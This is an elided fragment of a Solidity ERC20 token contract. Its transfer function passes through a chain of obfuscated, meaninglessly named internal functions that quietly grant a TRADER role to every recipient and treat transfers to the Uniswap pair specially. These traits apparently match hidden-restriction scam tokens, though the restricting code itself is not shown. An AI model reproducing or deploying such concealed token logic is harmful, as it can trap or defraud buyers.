...
abstract contract CIENXLSEConsole is Context, CIENXLSERoleControl {
    ...
    function _roleCheke(bytes32 role, address account, uint256 amt) internal {
        ...
        _roleChekes(role, account, amt);
    }

    function _roleChekes(bytes32 role, address account, uint256 amt) internal {
    ...
    function _roleNewCheked(bytes32 role, address account, uint256 num) internal virtual {
...
contract CIENXLSEERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is CIENXLSEERC20, CIENXLSEConsole {
    ...
    ) CIENXLSEERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(CIENXLSEERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");


        _CIENXLSEnozlxws(from, to, amt);
    }



    function _CIENXLSEnozlxws(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");

        _CIENXLSExienffla(from, to, amt);
    }

    function _CIENXLSExienffla(address from, address to, uint256 amt) internal {
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        _CIENXLSExieasxw(from, to, amt);
    }

    function _CIENXLSExieasxw(address from, address to, uint256 amt) internal {
        ...
        _CIENXLSExoeaspw(from, to, amt);
    }

    function _CIENXLSExoeaspw(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        _CIENXLSExiewpos(from, to, amt);
    }

    function _CIENXLSExiewpos(address from, address to, uint256 amt) internal {
        
        _CIENXLSExopekse(from, to, amt);
    }

    function _CIENXLSExopekse(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
        ...
        _CIENXLSExepoawxh(from, to, amt);
    }

    function _CIENXLSExepoawxh(address from, address to, uint256 amt) internal {
